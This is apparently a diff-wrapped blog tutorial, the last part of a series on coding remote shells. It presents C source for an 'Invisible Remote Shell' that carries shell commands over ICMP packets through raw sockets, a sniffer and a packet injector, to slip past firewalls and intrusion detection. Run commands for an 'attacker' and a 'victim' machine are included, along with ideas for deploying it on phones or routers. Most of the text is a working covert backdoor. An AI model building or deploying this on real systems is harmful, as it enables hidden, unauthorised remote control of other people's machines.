@@ -1,0 +1,250 @@
+In this last part of this series, we are going to see how to build a pretty stealth remote shell. This remote shell usually also have better chances to avoid detection systems like firewalls and IDS.
+
+As described above, it sounds like the definitely remote access tool. Doesn’t it?. Well, actually such a thing, a definitely tool, does not exist. Reality is a bit more like what we discussed in the Port Scanning post 9. There are different techniques. Some work in some scenarios, and some work on other scenarios. It is up to you to use the right one at any time. The Uber Hacking Tool does not exists…
+
+The Invisible Shell Concept
+The idea is to use an unusual communication channel with our remote shell. Call back home TCP connections using common ports (80, 443) are a good solution to keep the remote shell low profile but, only if that machine has some HTTP traffic (ports 80, 443). Otherwise, seeing an HTTP connection in a server which shouldn’t connect to a web server may be very suspicious.
+
+So, our Invisible Remote Shell™ uses ICMP packets to transfer the shell data and commands between the two machines. It is true, it generates an unusual ICMP traffic that may fire some alarms. It all depends on the scenario. That is why we need different tools.
+
+The idea is pretty simple (and old), and our current code base will help us a lot to get it working quickly… What we have to do is:
+
+Change our client/server sockets into a RAW socket
+Write a sniffer to capture ICMP traffic
+Write a packet injector to send ICMP messages
+Easy eh?.. Actually you will be surprised to see how easy it is. Let’s dive in the code
+
+Modifying our Main Loop
+We will start with a small modification in our main loop function. The one called async_read. I include the whole function here but you only have to look to the FD_ISSET blocks, everything else remains the same:
+
+void
+async_read (int s, int s1)
+{
+  fd_set         rfds;
+  struct timeval tv;
+  int            max = s > s1 ? s : s1;
+  int            len, r;
+  char           buffer[BUF_SIZE];
+
+  max++;
+
+  while (1)
+    {
+      FD_ZERO(&rfds);
+      FD_SET(s,&rfds);
+      FD_SET(s1,&rfds);
+
+      /* Time out. */
+      tv.tv_sec = 1;
+      tv.tv_usec = 0;
+
+      if ((r = select (max, &rfds, NULL, NULL, &tv)) < 0)
+	{
+	  perror ("select:");
+	  exit (EXIT_FAILURE);
+	}
+      else if (r > 0) /* If there is data to process */
+	{
+	  if (FD_ISSET(s, &rfds))
+	    {
+	      memset (buffer, 0, BUF_SIZE);
+	      if ((len = net_read (s, buffer, BUF_SIZE)) == 0) continue;
+	      write (s1, buffer, len);
+	    }
+	  if (FD_ISSET(s1, &rfds))
+	    {
+	      memset (buffer, 0, BUF_SIZE);
+	      if ((len = read (s1, buffer, BUF_SIZE)) <= 0) exit (EXIT_FAILURE);
+
+	      net_write (s, buffer, len);
+	    }
+	}
+    }
+}
+
+
+Previously (actually in Part II 2), we were reading from one of the sockets and then crypting or decrypting the buffer before sending them to the other socket. Now we are using two function pointers to encapsulate our special channel. This special channel was a crypted channel in Part II of this series, and now is going to be an ICMP channel. You can easily rewrite versions of net_read and net_write for the old crypt case if you want.
+
+As said, net_read and net_write are two function pointers that we can easily change (at run-time) to point to different implementation. You can find the declaration at the beginning of the file:
+
+static int (*net_read)  (int fd, void *buf, size_t count);
+static int (*net_write) (int fd, void *buf, size_t count);
+In this example we are just pointing them to our ICMP related functions (we will describe them in a sec) at the beginning of the main function. This way you can add more special channels and select them, for instance, using command-line arguments.
+
+  net_read = net_read_icmp;
+  net_write = net_write_icmp;
+Creating A RAW Socket
+Let’s create a RAW socket. The same RAW socket will be used to write our sniffer (to capture the ICMP traffic) and also to inject our ICMP requests with our own data.
+
+int
+raw_init (char *ip, int proto)
+{
+  int s;
+
+  if ((s = socket (AF_INET, SOCK_RAW, proto)) < 0)
+    {
+      perror ("socket:");
+      exit (1);
+    }
+
+  dest.sin_family = AF_INET;
+  inet_aton (ip, &dest.sin_addr);
+  fprintf (stderr, "+ Raw to '%s' (type : %d)\n", ip, icmp_type);
+
+  return s;
+}
+Pretty straightforward, isn’t it?. We are using two parameters in this function. The first one is the destination IP of our ICMP packets. To keep it simple we have decided to pass it as a parameter. A better solution (to enable connection from non fixed places) is to use a special packet to communicate this information to the server… anyway, you will shortly find out that you can play a lot with this small program we are writing.
+
+Now, we have almost everything in place. It is time to write our sniffer and our packet crafting functions.
+
+The Sniffer
+The sniffer is implemented by the function net_read_icmp. Before checking the code we have to introduce an auxiliary data structure to help as in accessing the data in the packets.
+
+typedef struct 
+{
+  struct iphdr   ip;
+  struct icmphdr icmp;
+  int            len; 
+  char           data[BUF_SIZE]; /* Data */
+} PKT;
+This structure represents a packet as it is read from a IPPROTO_ICMP RAW socket (we will come to this a bit later). The RAW socket will return an IP header, then a ICMP header followed by the data.
+
+In this example, and again, to keep things simple, we are using a fixed packet format. Our data packet is composed of an integer indicating the size of the data in the packet, plus a data block with a maximum size of BUF_SIZE. So our packets will look like this
+
++-----------+-------------+-------------------+
+| IP Header | ICMP Header | Len  | shell data |  
+|           +-------------+-------------------+
++---------------------------------------------+
+With all this information, we can write our sniffer:
+
+int
+net_read_icmp (int s, void *buf, size_t count)
+{
+  PKT pkt;
+  int len, l;
+
+  l = read (s, &pkt, sizeof (PKT)); // Read IP + ICMP header
+  if ((pkt.icmp.type == icmp_type) && 
+      (ntohs(pkt.icmp.un.echo.id) == id))
+    {
+      len = ntohs (pkt.len);
+      memcpy (buf, (char*)pkt.data, len);
+      return len;
+    }
+
+  return 0;
+}
+As our packets have a fixed size, we can just read then in one shot (note that this may have issues in a heavily loaded network…), and then we just check the ICMP message type and id. This is the way we mark our packets to know they are ours and not a regular ICMP message.
+
+An alternative is to add a magic word just before the len in the data part of the packet and check that value to identify the packet.
+
+If the packet is ours (and not a normal ICMP packet), the data is copied in the provided buffer and its length is returned. The async_read function takes care of the rest from this point on.
+
+The Packet Injector
+The other missing part for our Invisible Remote Shell ™ is the function to write into the network our shell data within ICMP packets. Here we also use a data structure to help us build the packet easily. I’m building the packet in a bit more realistic way for illustration purposes, but in principle you could also use a fixed buffer for the data.
+
+typedef struct 
+{
+  struct icmphdr icmp;
+  int    len;
+} PKT_TX;
+This represents the packet we will be sending. By default, sockets RAW does not give us access to the IP header. This is convenient as we do not have to care about feeding IP addressed or calculating checksums for the whole IP packet. It can indeed be forced, but in this case it is just not convenient. That is why our transmission packet does not have an IP header. If you need to access the IP header, you can do it using the IP_HDRINCL socket option (man 7 raw for more info).
+
+We have also removed the fixed buffer at the end, because we are going to calculate the exact packet size based on the net_write_icmp parameters.
+
+The packet injector looks like this:
+
+int
+net_write_icmp (int s, void *buf, size_t count)
+{
+  PKT_TX          *pkt;
+  struct icmphdr *icmp = (struct icmphdr*) &pkt;
+  int             len;
+
+  pkt = malloc (sizeof (PKT_TX) + count);
+  icmp = (struct icmphdr*) pkt;
+  pkt->len = htons(count);
+  memcpy ((unsigned char*)pkt + sizeof(PKT_TX), buf, count);
+
+  len = count + sizeof(int);
+  len += sizeof (struct icmphdr);
+
+  /* Build an ICMP Packet */
+  icmp->type = icmp_type;
+  icmp->code = 0;
+  icmp->un.echo.id = htons(id);
+  icmp->un.echo.sequence = htons(5);
+  icmp->checksum = 0;
+  icmp->checksum = icmp_cksum ((char*)icmp, len);
+
+  sendto (s, pkt, len, 0,
+	  (struct sockaddr*) &dest,
+	  sizeof (struct sockaddr_in));
+  free (pkt)
+  return len;
+}
+At the beginning of the function we dynamically allocate our packet including the size of the buffer we want to transmit. After that we just fill in the ICMP header. The only important fields are the icmp_type and the id. As you may remember, these two parameters are the ones used by our sniffer to identify our own packets.
+
+Once all the ICMP fields are set as we want, we have to set the checksum field to zero and calculate the checksum for the packet. This is done by the icmp_cksum function that I have got from some example in the internet. You can take a look to it in the code if you want, but it is just a check sum on the packet content.
+
+After generating the correct checksum, we can send our packet out. For RAW sockets, were we are not binding the socket to any address and there is no accept or connect involved, we have to use the datagram primitives. The sendto system call allows us to send data to a specific address, in this case to the IP address we passed to the program as parameter. Remember that we are not setting the IP header so this is the way we provide the destination IP address to the TCP/IP stack.
+
+A New Main
+To accommodate the new function we need to modify the main function.
+
+int
+main (int argc, char *argv[])
+{
+  int  i =1;
+  net_read = net_read_icmp;
+  net_write = net_write_icmp;
+
+  if (argv[i][0] == 's')
+    secure_shell (raw_init (argv[i+1], IPPROTO_ICMP));
+  else if (argv[i][0] == 'c')
+    async_read (raw_init (argv[i+1], IPPROTO_ICMP), 0);
+  
+  return 0;
+}
+ 
+The first thing we do is to initialise the network I/O functions. In this case is a bit pointless, but if you implement additional comm channels for the application (ARP frames on LAN?.. do not even know if it is possible :)) you could easily add a command-line parameter to select one or the other.
+
+The rest of the program is the one you have been seeing during this series, but using the new raw_init function instead of the old server_init or client_init. You can see how we set the RAW socket protocol to IPPROTO_ICMP, so we only read ICMP packets… otherwise our sniffer will probably crash very badly.
+
+Running the Invisible Remote Shell ™
+The program, as it is coded, does not work on the loopback interface. The reason is that, in such situation, we will have two processes capturing the same ICMP traffic and the whole thing goes nuts.
+
+So, either you change the code to use different messages on client and server, or you use a different machine. I haven’t tested on a virtual machine, but I think it should work.
+
+To test the program, in the attacker machine run:
+
+$ sudo ./irs c victim_ip
+And on the victim machine you have to run:
+
+$ sudo ./irs s attacker_ip
+Both programs have to be executed as root or proper capabilities have to be set. We are using RAW sockets that requires administrator privileges. It does not matter which side is started first, we are sniffing traffic anyway.
+
+When you run the test, you can check the traffic with
+
+$ sudo tcpdump -nnXSs 0 -i eth0  icmp
+A Word on libpcap
+In case you have been following my posts, you may be wondering…
+
+hey!, why not use libpcap/libdnet?.
+
+It is indeed a very good question, and I think that will be a nice exercise (rewrite the Invisible Remote Shell using those libraries). There are two reasons why I used sockets RAW to implement this:
+
+First is that I promised that I will talk about sniffers and that such a talk will come in two flavors… So, this was the second flavor (RAW sockets)
+The second is related to the previous article in the series. If you want to deploy this code in a smartphone or a router, you can just compile it into a static binary. The code only uses system calls and does not rely on any library. Using libpcap in that scenario will require you to also cross-compile that library for statically linking it in our code… That can indeed be done, but it is a bit more cumbersome.
+The End
+So, this concludes this series on how to code remote shells. Hope you enjoyed reading it as much as I enjoyed writing it. Do not hesitate to send me a note or add a comment if you have any question
+
+As usual, here are some things you can try based on what we have just discussed:
+
+You have all the pieces to write tools like ping or traceroute
+Change the program to provide the IP to connect to using a specially crafted packet
+Encrypt the ICMP data content
+Use and HTTP stream instead (reverse_http anybody?)
+Have fun!
+
+Code available at: https://github.com/0x00pf/0x00sec_code/tree/master/remote_shell 64
